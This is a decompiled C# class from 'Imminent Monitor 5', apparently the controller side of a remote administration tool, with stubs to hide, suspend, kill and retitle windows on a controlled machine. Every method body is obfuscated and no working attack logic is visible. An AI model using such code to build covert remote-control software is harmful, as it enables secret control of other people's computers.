// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.WindowCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System.Collections.Generic;

namespace ImminentMonitor.Cef
{
  public class WindowCefHandler
  {
    public NewFormSystemManagers SystemManagers;

    public WindowCefHandler(NewFormSystemManagers systemManagers) => this.SystemManagers = systemManagers;

    public void refreshWindows()
    {
      object[] object_3 = new object[1]{ (object) this };
      Class86.smethod_0().method_68(Class86.smethod_1(), "I@uaePa.Q$", object_3);
    }

    public void suspendWindows(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "TW+*<Pa.Q$", object_3);
    }

    public void resumeWindows(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), ")6K'cPa.Q$", object_3);
    }

    public void hideWindows(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "\"jrKsPa.Q$", object_3);
    }

    public void showWindows(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "/D62MPa.Q$", object_3);
    }

    public void minimizeWindows(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "HGPc.Pa.Q$", object_3);
    }

    public void restoreWindows(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), ":<SfaPa.Q$", object_3);
    }

    public void killWindows(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "$1sCEPa.Q$", object_3);
    }

    public void changeWindowTexts(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      Class86.smethod_0().method_68(Class86.smethod_1(), "F5W4FPa.Q$", object_3);
    }

    private List<int> GetHandleList(object[] rows)
    {
      object[] object_3 = new object[2]
      {
        (object) this,
        (object) rows
      };
      return (List<int>) Class86.smethod_0().method_270(Class86.smethod_1(), "J/=B4Pa.Q$", object_3);
    }
  }
}
